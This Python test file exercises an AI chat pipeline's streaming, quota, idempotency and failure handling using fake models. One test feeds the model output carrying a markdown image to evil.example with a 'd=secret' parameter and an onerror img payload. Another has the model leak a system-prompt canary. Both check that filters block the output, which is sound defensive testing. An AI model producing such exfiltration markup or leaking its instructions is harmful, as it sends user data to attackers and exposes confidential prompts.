"""B11/B12: the whole pipeline in-process (real orchestrator + Lua quota + leases + repository + SSE; fake models)."""

from __future__ import annotations

import asyncio
import uuid
from datetime import datetime, timedelta, timezone

import pytest

from src.models.chat_models import ChatFilters, MessageStatus
from src.models.common import TaskType
from src.rag.metrics import metrics
from src.services.chat import canned
from src.services.chat.data_store import CommitmentFacts
from src.services.chat.errors import (
    DuplicateInFlightError, FeatureDisabledError, InvalidInputError, ModelUnavailableError, ProviderError,
    QuotaExceededError, RateLimitedError, SessionBusyError, TooManyStreamsError,
)
from tests.chat.conftest import FIXED_NOW, eventually, make_claims
from tests.chat.harness import Harness, make_harness, names, parse_frames, streamed_text
from tests.chat.helpers import FakeStreamer, make_chunk, make_retrieval

pytestmark = pytest.mark.asyncio


async def assistant_docs(h: Harness) -> list[dict]:
    return [d async for d in h.db["chat_messages"].find({"role": "assistant"})]


async def user_doc(h: Harness) -> dict:
    return await h.db["chat_messages"].find_one({"role": "user"})


# ─── happy path ───────────────────────────────────────────────────────────────


async def test_happy_path_order_persistence_cost_and_no_leaks():
    h = await make_harness()
    frames, prepared = await h.query()
    assert names(frames) == ["meta", "status", "status", "sources", "status", "token", "token", "token", "citations", "usage", "done"] or \
        names(frames)[0] == "meta" and names(frames)[-3:] == ["citations", "usage", "done"]
    assert names(frames)[:1] == ["meta"] and "sources" in names(frames)
    assert names(frames).index("sources") < names(frames).index("token")           # sources first, THEN tokens
    stages = [f.data["stage"] for f in frames if f.event == "status"]
    assert stages == ["searching", "reading", "answering"]

    text = streamed_text(frames)
    assert text == "Ahmed will ship billing by Friday [S1]. Sara reviews it [S1]."
    (a,) = await assistant_docs(h)
    assert a["content"] == text and a["finish_reason"] == "stop" and a["status"] == "answered"       # persisted == streamed
    assert [r["source_id"] for r in a["source_refs"]] == ["S1", "S2"]
    assert a["citations"]["valid"] == ["S1"] and a["prompt_versions"]["system"] == "chat-system-v1.0"
    assert a["intent"] == "LOOKUP" and a["latency"]["total_ms"] >= 0 and a["usage"]["input_tokens"] == 9000

    meta = frames[0].data
    assert meta["replayed"] is False and meta["message_id"] == a["_id"] and meta["session_id"] == prepared.accepted.session_id
    done = frames[-1].data
    assert done["finish_reason"] == "stop"
    usage = [f for f in frames if f.event == "usage"][0].data
    assert usage["input_tokens"] == 9000 and usage["output_tokens"] == 120 and "cost_usd" not in usage and usage["quota_remaining"] == 199

    assert (await user_doc(h))["status"] == "answered"
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["used"] == 1
    assert await h.lease_count() == 0

    # ledger == accumulator == sum of provider-reported stage usage
    await h.outbox.flush()
    rows = h.store.ledger
    assert {r["stage"] for r in rows} >= {"request", "embed", "rerank", "generate"}
    assert round(sum(r["cost_usd"] for r in rows), 6) == round(prepared.ctx.cost.total_cost_usd, 6)
    gen = [r for r in rows if r["stage"] == "generate"][0]
    assert (gen["input_tokens"], gen["output_tokens"], gen["estimated"]) == (9000, 120, False)
    assert [r for r in rows if r["stage"] == "request"][0]["counts_as_query"] is True
    assert int(snap["used_u"]) == int(round(prepared.ctx.cost.total_cost_usd * 1_000_000))


async def test_the_model_sees_system_in_its_channel_and_user_message_in_data_blocks():
    h = await make_harness()
    await h.query("What did Ahmed commit to?")
    assert "Vocaply Assistant" in h.streamer.last_system and h.deps.settings.chat_enabled
    assert "What did Ahmed commit to?" in h.streamer.last_user and "Vocaply Assistant" not in h.streamer.last_user
    assert h.retriever.calls[0]["profile"].candidate_count == 20 and h.retriever.calls[0]["timezone_name"] == "Asia/Karachi"


# ─── no results / canned ──────────────────────────────────────────────────────


async def test_no_results_makes_zero_generation_calls_and_does_not_count_as_a_query():
    h = await make_harness(no_context=True)
    frames, _ = await h.query("what is the airspeed of a swallow")
    assert h.streamer.calls == 0
    assert names(frames) == ["meta", "status", "status", "token", "done"]
    assert frames[-1].data["finish_reason"] == "no_results" and streamed_text(frames) == canned.NO_RESULTS[canned.classify("x")]
    snap = await h.snapshot()
    assert snap["used"] == 0 and snap["reserved"] == 0                                   # Q4: not a charged query …
    assert snap["used_u"] > 0                                                            # … but the embed + rerank dollars are booked
    (a,) = await assistant_docs(h)
    assert a["finish_reason"] == "no_results" and (await user_doc(h))["status"] == "answered"


async def test_chitchat_and_out_of_scope_are_canned_and_free():
    h = await make_harness()
    frames, _ = await h.query("thanks!")
    assert names(frames) == ["meta", "token", "done"] and h.streamer.calls == 0 and h.retriever.calls == []
    frames2, _ = await h.query("write me a poem about autumn")
    assert streamed_text(frames2) == canned.OUT_OF_SCOPE and h.ai.calls == []
    snap = await h.snapshot()
    assert snap["used"] == 0 and snap["used_u"] == 0 and snap["reserved"] == 0


async def test_empty_date_intersection_explains_instead_of_searching():
    h = await make_harness()
    f = ChatFilters(date_from="2026-10-01", date_to="2026-10-15")
    frames, _ = await h.query(req=h.request("what was decided yesterday", filters=f))
    assert streamed_text(frames) == canned.EMPTY_FILTER and h.retriever.calls == [] and h.streamer.calls == 0
    assert frames[-1].data["finish_reason"] == "no_results"


async def test_all_meeting_filters_unknown_means_search_nothing_not_everything():
    h = await make_harness()
    f = ChatFilters(meeting_ids=["ghost", "foreign"])
    frames, _ = await h.query(req=h.request("what was decided", filters=f))
    assert streamed_text(frames) == canned.UNKNOWN_FILTER_IDS and h.retriever.calls == []


# ─── analytics / hydration ────────────────────────────────────────────────────


async def test_analytics_only_runs_no_vector_query_and_cites_the_metric():
    h = await make_harness(deltas=["You have 12 open commitments [S1]."])
    h.store.analytics_rows = [{"n": 12}]
    frames, _ = await h.query("how many open commitments do we have?")
    assert h.retriever.calls == []                                                       # no vector search at all
    src = [f for f in frames if f.event == "sources"][0].data["sources"]
    assert len(src) == 1 and src[0]["type"] == "analytics" and src[0]["tool"] == "count_commitments" and src[0]["as_of"]
    assert "definition:" in h.streamer.last_user and "count: 12" in h.streamer.last_user
    assert h.store.analytics_calls and "rag.v_chat_commitments" in h.store.analytics_calls[0][0]
    assert frames[-1].data["finish_reason"] == "stop"


async def test_analytics_error_with_no_other_source_ends_as_no_results():
    h = await make_harness()
    h.store.analytics_error = RuntimeError("pg exploded")
    frames, _ = await h.query("how many open commitments do we have?")
    assert h.streamer.calls == 0 and frames[-1].data["finish_reason"] == "no_results"


async def test_commitment_status_is_hydrated_at_query_time_not_read_from_embedded_text():
    chunk = make_chunk("Ahmed will migrate billing. (embedded when status was PENDING)", source_type="commitment",
                       source_id="c1", meeting_id="m1")
    store = None
    h = await make_harness(chunks=[chunk])
    h.store.commitments["c1"] = CommitmentFacts("c1", "commitment", "t", "FULFILLED", "u1", "Ahmed Khan",
                                                datetime(2026, 11, 4, tzinfo=timezone.utc), "m1")
    h.store.users.update({"u1": "Ahmed Khan"})
    await h.query("Is Ahmed's billing migration done?")
    assert "status: FULFILLED" in h.streamer.last_user and "owner: Ahmed Khan" in h.streamer.last_user
    sent = h.retriever.calls[0]
    assert "Ahmed Khan" in sent["query"]                                                  # canonical name → lexical boost
    assert [t.value for t in sent["filters"].source_types][:2] == ["commitment", "action_item"]


async def test_deleted_commitment_is_dropped_and_if_nothing_remains_it_is_no_results():
    chunk = make_chunk("gone", source_type="commitment", source_id="c-deleted")
    h = await make_harness(chunks=[chunk])
    frames, _ = await h.query("what did Ahmed commit to?")
    assert h.streamer.calls == 0 and frames[-1].data["finish_reason"] == "no_results"


# ─── generation failures ──────────────────────────────────────────────────────


async def test_failure_before_first_token_retries_once_then_succeeds():
    st = FakeStreamer(["ok [S1]."])
    st.fail_first_n = 1
    h = await make_harness(streamer=st)
    frames, _ = await h.query()
    assert st.calls == 2 and frames[-1].data["finish_reason"] == "stop"


async def test_persistent_failure_before_first_token_emits_error_releases_quota_and_persists_no_partial():
    st = FakeStreamer(error_before=ProviderError("server", "503", retryable=True))
    h = await make_harness(streamer=st)
    frames, _ = await h.query()
    assert names(frames)[-1] == "error" and frames[-1].data["code"] == "MODEL_UNAVAILABLE" and frames[-1].data["retryable"] is True
    assert "done" not in names(frames) and "usage" not in names(frames)
    assert st.calls == 2 and await assistant_docs(h) == []                               # no partial message
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["used"] == 0                                                              # the query was NOT charged
    assert (await user_doc(h))["status"] == "failed"                                      # so a retry re-runs


async def test_failure_after_tokens_persists_the_partial_with_error_and_commits_an_estimate():
    st = FakeStreamer(["Ahmed will ", "ship it", " by Fri"], error_after=(2, ProviderError("server", "boom")))
    h = await make_harness(streamer=st)
    frames, prepared = await h.query()
    assert st.calls == 1                                                                   # no silent retry after tokens
    assert names(frames)[-1] == "error"
    text = streamed_text(frames)
    assert text == "Ahmed will ship it"
    (a,) = await assistant_docs(h)
    assert a["content"] == text and a["finish_reason"] == "error" and a["status"] == "error"
    assert a["usage"]["estimated"] is True
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["used"] == 0 and snap["used_u"] > 0                                       # dollars booked, query not counted


async def test_first_token_timeout_retries_then_times_out():
    st = FakeStreamer(["late"], first_token_delay_s=5)
    h = await make_harness(streamer=st, settings_kw=dict(chat_first_token_timeout_s=0.1, chat_idle_timeout_s=0.2))
    frames, _ = await h.query()
    assert frames[-1].event == "error" and frames[-1].data["code"] == "TIMEOUT" and st.calls == 2


async def test_idle_timeout_mid_stream_keeps_the_partial_and_reports_timeout():
    st = FakeStreamer(["Hello ", "there ", "never finishes"], hang_after=2)
    h = await make_harness(streamer=st, settings_kw=dict(chat_first_token_timeout_s=1.0, chat_idle_timeout_s=0.15))
    frames, _ = await h.query()
    assert frames[-1].data["code"] == "TIMEOUT" and streamed_text(frames) == "Hello there "
    assert st.closed >= 1                                                                  # the upstream stream was closed
    (a,) = await assistant_docs(h)
    assert a["content"] == "Hello there "


async def test_length_finish_is_reported_and_provider_filter_is_friendly():
    h = await make_harness(streamer=FakeStreamer(["cut off mid sen"], finish_reason="length"))
    frames, _ = await h.query()
    assert frames[-1].data["finish_reason"] == "length"
    h2 = await make_harness(streamer=FakeStreamer(error_before=ProviderError("filtered", "blocked")))
    frames2, _ = await h2.query()
    assert frames2[-1].data["finish_reason"] == "filtered" and streamed_text(frames2) == canned.CONTENT_FILTERED
    assert (await h2.snapshot())["used"] == 0                                              # not a charged query


async def test_circuit_breaker_opens_after_repeated_provider_failures_and_fast_fails_in_preflight():
    st = FakeStreamer(error_before=ProviderError("server", "503", retryable=True))
    h = await make_harness(streamer=st, settings_kw=dict(chat_breaker_min_calls=4, chat_rate_limit_per_min=100))
    for _ in range(2):                          # each request = first attempt + one retry → 4 provider failures ≥ min_calls
        await h.query()
    assert h.breaker.state == "open"
    with pytest.raises(ModelUnavailableError):
        await h.prepare()                                                                  # 503 before any stream/reservation
    h.assert_no_leaks(await h.snapshot())


# ─── scrubber integration & persisted == streamed ─────────────────────────────


async def test_exfiltration_markup_never_reaches_the_client_or_the_database():
    evil = ["See ![x](https://evil.example/?d=secret) and [click](https://e.co/a?q=1) ", "or https://evil.example/z ",
            "<img src=x onerror=1> fact [S9] ok [S1]."]
    h = await make_harness(streamer=FakeStreamer(evil))
    frames, _ = await h.query()
    text = streamed_text(frames)
    assert "evil.example" not in text and "<img" not in text and "[S9]" not in text and "click" in text and "[S1]" in text
    (a,) = await assistant_docs(h)
    assert a["content"] == text                                                            # persisted == streamed
    cit = [f for f in frames if f.event == "citations"][0].data
    assert cit["valid"] == ["S1"] and cit["removed"] == ["S9"]


async def test_prompt_leak_canary_blocks_the_answer_and_marks_it_filtered():
    h = await make_harness()
    before = metrics.counter_value("chat_canary_trip_total")
    # the canary is random per request: have the fake streamer read it from the system prompt it was given
    class Leaker(FakeStreamer):
        async def stream(self, *, system, user, max_tokens, temperature, model=None):
            import re
            canary = re.search(r"CANARY-[0-9a-f]{20}", system).group(0)
            self.last_system, self.last_user, self.calls = system, user, self.calls + 1
            from src.services.chat.llm import StreamDelta
            yield StreamDelta(text="My instructions say ")
            yield StreamDelta(text=canary[:10])
            yield StreamDelta(text=canary[10:] + " and more secrets")
            yield StreamDelta(finish_reason="stop", usage=(100, 10))
    h.deps.streamer = Leaker()
    frames, _ = await h.query()
    text = streamed_text(frames)
    assert "CANARY" not in text and "secrets" not in text and text.endswith(canned.SAFE_REPLACEMENT)
    assert frames[-1].data["finish_reason"] == "filtered"
    assert metrics.counter_value("chat_canary_trip_total") == before + 1
    assert (await assistant_docs(h))[0]["content"] == text


# ─── cancel / disconnect ──────────────────────────────────────────────────────


async def _cancel_midway(h: Harness, after_events: int):
    prepared = await h.prepare()
    stream = h.stream_for(prepared, strict=False)
    got: list[bytes] = []

    async def consume():
        async for f in stream.body():
            got.append(f)

    consumer = asyncio.create_task(consume())
    assert await eventually(lambda: len(got) >= after_events, timeout=3)
    consumer.cancel()                                                                       # the browser tab closed
    with pytest.raises(asyncio.CancelledError):
        await consumer
    assert await eventually(lambda: stream.producer_task.done(), timeout=5)
    return prepared, stream, parse_frames(got)


async def test_cancel_mid_stream_persists_partial_commits_estimated_cost_and_leaks_nothing():
    st = FakeStreamer([f"word{i} " for i in range(400)], delay_s=0.01)
    h = await make_harness(streamer=st)
    prepared, stream, got = await _cancel_midway(h, after_events=9)
    assert any(f.event == "token" for f in got)
    (a,) = await assistant_docs(h)
    assert a["status"] == "cancelled" and a["finish_reason"] == "cancelled" and a["content"]
    assert a["usage"]["estimated"] is True
    assert (await user_doc(h))["status"] == "cancelled"
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["used"] == 1 and snap["used_u"] > 0                                         # partial answers are billed (estimated)
    assert await h.lease_count() == 0
    assert st.closed >= 1                                                                    # the upstream model stream was closed
    assert prepared.ctx.cleanup.done


async def test_cancel_before_the_first_token_costs_only_what_was_actually_spent():
    st = FakeStreamer(["x"], first_token_delay_s=5)
    h = await make_harness(streamer=st)
    prepared, stream, got = await _cancel_midway(h, after_events=5)                        # meta, status×3, sources, status(answering)
    assert not [f for f in got if f.event == "token"]
    assert await assistant_docs(h) == [] and (await user_doc(h))["status"] == "cancelled"
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["used"] == 0                                                                 # no answer was delivered → not a query


# ─── idempotency matrix ───────────────────────────────────────────────────────


async def test_completed_message_retry_is_a_free_replay_with_zero_model_calls():
    h = await make_harness()
    cid = str(uuid.uuid4())
    first, p1 = await h.query(req=h.request("What did Ahmed commit to?", client_id=cid))
    calls, retr = h.streamer.calls, len(h.retriever.calls)
    snap = await h.snapshot()
    again, p2 = await h.query(req=h.request("What did Ahmed commit to?", client_id=cid, session_id=p1.accepted.session_id))
    assert again[0].data["replayed"] is True and streamed_text(again) == streamed_text(first)
    assert names(again)[0] == "meta" and names(again)[-1] == "done" and "sources" in names(again)
    assert h.streamer.calls == calls and len(h.retriever.calls) == retr                     # no model, no retrieval
    assert await h.snapshot() == snap                                                       # no second charge
    assert await h.db["chat_messages"].count_documents({"role": "user"}) == 1
    assert p2.reservation is None and p2.ctx.cleanup.done


async def test_in_flight_duplicate_gets_409_and_leaks_nothing():
    st = FakeStreamer([f"w{i} " for i in range(200)], delay_s=0.02)
    h = await make_harness(streamer=st)
    cid = str(uuid.uuid4())
    prepared = await h.prepare(req=h.request(client_id=cid))
    stream = h.stream_for(prepared, strict=False)
    stream.start()
    await asyncio.sleep(0.1)
    with pytest.raises(DuplicateInFlightError) as ei:
        await h.prepare(req=h.request(client_id=cid, session_id=prepared.accepted.session_id))
    assert ei.value.http_status == 409 and ei.value.extra["request_id"] == prepared.ctx.request_id
    prepared.ctx.cancel.cancel("test_done")
    await asyncio.wait_for(stream.producer_task, 5)
    h.assert_no_leaks(await h.snapshot())


async def test_failed_message_reruns_with_a_new_assistant_message_and_one_charge():
    st = FakeStreamer(["ok [S1]."])
    st.fail_first_n = 99
    h = await make_harness(streamer=st)
    cid = str(uuid.uuid4())
    f1, p1 = await h.query(req=h.request(client_id=cid))
    assert f1[-1].event == "error"
    st.fail_first_n = 0
    f2, _ = await h.query(req=h.request(client_id=cid, session_id=p1.accepted.session_id))
    assert f2[-1].data["finish_reason"] == "stop" and f2[0].data["replayed"] is False
    assert await h.db["chat_messages"].count_documents({"role": "user"}) == 1
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["used"] == 1


async def test_a_crashed_run_whose_lease_expired_is_rerun_and_reuses_its_reservation():
    h = await make_harness()
    cid = str(uuid.uuid4())
    p1 = await h.prepare(req=h.request(client_id=cid))                                      # accepted + leases + reserved … then the pod dies
    await p1.ctx.cleanup.run()                                                               # (its leases are released by TTL in real life)
    repo = h.repo()
    await repo.messages.update_one({"_id": p1.accepted.user_message_id}, {"$set": {"lease_expires_at": 0.0}})
    frames, p2 = await h.query(req=h.request(client_id=cid, session_id=p1.accepted.session_id))
    assert frames[-1].data["finish_reason"] == "stop" and p2.accepted.state == "rerun"
    assert (await h.snapshot())["used"] == 1


# ─── concurrency & preflight failures ─────────────────────────────────────────


async def test_third_concurrent_stream_is_refused_and_its_message_is_failed_not_stuck():
    h = await make_harness(streamer=FakeStreamer([f"w{i} " for i in range(300)], delay_s=0.02))
    runs = []
    for _ in range(2):
        p = await h.prepare()
        s = h.stream_for(p, strict=False)
        s.start()
        runs.append((p, s))
    third_id = str(uuid.uuid4())
    with pytest.raises(TooManyStreamsError) as ei:
        await h.prepare(req=h.request(client_id=third_id))
    assert ei.value.http_status == 429
    stuck = await h.db["chat_messages"].find_one({"client_message_id": third_id})
    assert stuck["status"] == "failed"                                                       # compensated: a retry will re-run
    for p, s in runs:
        p.ctx.cancel.cancel("test_done")
        await asyncio.wait_for(s.producer_task, 5)
    snap = await h.snapshot()
    h.assert_no_leaks(snap)
    assert snap["reserved"] == 0
    h2, _ = await h.query(req=h.request(client_id=third_id, session_id=stuck["session_id"]))   # the retry now works
    assert h2[-1].data["finish_reason"] == "stop"


async def test_second_request_in_a_busy_session_gets_session_busy():
    h = await make_harness(streamer=FakeStreamer([f"w{i} " for i in range(300)], delay_s=0.02))
    p1 = await h.prepare()
    s1 = h.stream_for(p1, strict=False)
    s1.start()
    with pytest.raises(SessionBusyError) as ei:
        await h.prepare(req=h.request("another question", session_id=p1.accepted.session_id))
    assert ei.value.http_status == 409
    p1.ctx.cancel.cancel("test_done")
    await asyncio.wait_for(s1.producer_task, 5)
    assert await h.lease_count() == 0


@pytest.mark.parametrize("scenario", ["disabled", "invalid", "rate", "quota", "breaker"])
async def test_preflight_failures_are_real_exceptions_with_nothing_left_behind(scenario):
    kw = {"disabled": dict(chat_enabled=False), "rate": dict(chat_rate_limit_per_min=1), "quota": dict(chat_daily_limit_pro=1)}.get(scenario, {})
    h = await make_harness(settings_kw=kw)
    expect = {"disabled": FeatureDisabledError, "invalid": InvalidInputError, "rate": RateLimitedError,
              "quota": QuotaExceededError, "breaker": ModelUnavailableError}[scenario]
    if scenario == "invalid":
        req = h.request("x")
        req = req.model_copy(update={"message": "‮​ "})
    else:
        req = None
    if scenario == "breaker":
        h.breaker._opened_at = h.breaker._clock()
    if scenario in ("rate", "quota"):
        await h.query(req=h.request())                                                        # consume the allowance
    before = await h.db["chat_messages"].count_documents({})
    with pytest.raises(expect) as ei:
        await h.prepare(req=req)
    assert ei.value.http_status in (422, 429, 503)
    if scenario in ("rate", "quota"):
        assert ei.value.retry_after_s
    h.assert_no_leaks(await h.snapshot())
    assert await h.lease_count() == 0
    if scenario in ("disabled", "invalid", "breaker", "rate"):
        assert await h.db["chat_messages"].count_documents({}) == before                      # nothing was written
    if scenario == "quota":
        stuck = [m async for m in h.db["chat_messages"].find({"role": "user", "status": "failed"})]
        assert len(stuck) == 1                                                                  # accepted-then-refused → failed, retryable


# ─── memory / follow-ups ──────────────────────────────────────────────────────


async def test_follow_up_is_rewritten_with_history_and_the_raw_message_still_reaches_the_model():
    from src.models.common import TaskType
    ai = __import__("tests.chat.helpers", fromlist=["FakeAI"]).FakeAI().on(
        TaskType.CHAT_REWRITE, dict(standalone_question="What are Ahmed's blockers?", mentions=["Ahmed"], date_phrase=""))
    h = await make_harness(ai=ai)
    f1, p1 = await h.query("What is Ahmed working on?")
    f2, _ = await h.query("What about his blockers?", req=h.request("What about his blockers?", session_id=p1.accepted.session_id))
    assert ai.count(TaskType.CHAT_REWRITE) == 1                                               # only on the 2nd turn
    stages = [f.data["stage"] for f in f2 if f.event == "status"]
    assert stages[0] == "rewriting"
    assert "What about his blockers?" in h.streamer.last_user and "Ahmed&#39;s blockers" in h.streamer.last_user
    assert "[S1]" not in h.streamer.last_user.split("<sources_")[0]                           # prior markers stripped from history
    assert (await assistant_docs(h))[-1]["rewritten_query"] == "What are Ahmed's blockers?"


async def test_rolling_summary_runs_after_the_response_and_is_booked_as_a_system_cost():
    from src.models.common import TaskType
    from tests.chat.helpers import FakeAI
    ai = FakeAI().on(TaskType.CHAT_REWRITE, dict(standalone_question="What about billing status?", mentions=[], date_phrase="")) \
                 .on(TaskType.CHAT_MEMORY, dict(summary="User asked about Ahmed's billing work; it is in progress."))
    h = await make_harness(ai=ai, settings_kw=dict(chat_history_turns=1))
    sid = None
    for i in range(6):
        _, p = await h.query(f"billing question number {i}", req=h.request(f"billing question number {i}", session_id=sid))
        sid = p.accepted.session_id
        await h.memory.drain()
    session = await h.repo().get_session(sid)
    assert "billing work" in session["summary"] and session["summary_upto_msg_id"]
    await h.outbox.flush()
    assert any(r["category"] == "system" and r["stage"] == "memory" for r in h.store.ledger)


# ─── access scope (Q1) ────────────────────────────────────────────────────────


async def test_attendee_only_mode_scopes_retrieval_and_analytics():
    h = await make_harness(settings_kw=dict(chat_access_scope_mode="attendee_only"))
    h.store.attended = {"userA1": ["m1"]}
    await h.query("What did Ahmed commit to?")
    scope = h.retriever.calls[0]["filters"].access_scope
    assert scope.kind == "meetings" and scope.meeting_ids == ["m1"]
    h.store.analytics_rows = [{"n": 3}]
    await h.query("how many open commitments do we have?", req=h.request("how many open commitments do we have?"))
    sql, args = h.store.analytics_calls[-1]
    assert "meeting_id = ANY(" in sql and ["m1"] in args
